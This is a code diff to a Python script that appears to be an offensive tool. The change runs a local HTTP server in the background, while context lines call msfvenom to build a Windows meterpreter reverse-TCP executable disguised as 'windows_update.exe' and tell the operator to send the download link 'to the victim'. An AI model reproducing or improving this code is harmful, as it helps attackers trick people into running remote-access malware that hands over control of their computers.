@@ -1,6 +1,7 @@
 from re import M
 import requests, json, os, time, speedtest, shutil
 from colorama import Fore as F
+import subprocess
 
 def tentar():
     #if os.name == 'nt':
@@ -131,7 +132,7 @@ def tentar():
                     if port == '1234':
                         print(F.LIGHTRED_EX + "[*] YOU CAN'T USE PORT 1234")
                     else:
-                        os.system('python3 -m http.server 1234')
+                        subprocess.Popen(['python3', '-m', 'http.server', '1234'])
                         os.system(f'msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe lhost={ip} lport={port} -o windows_update.exe')
                         print(f'{F.LIGHTGREEN_EX}[*] Payload was saved as "windows_update.exe"{F.RESET}')
                         print(f'{F.LIGHTGREEN_EX}[*] Send link https://{ip}:{port}/windows_update.exe to the victim')
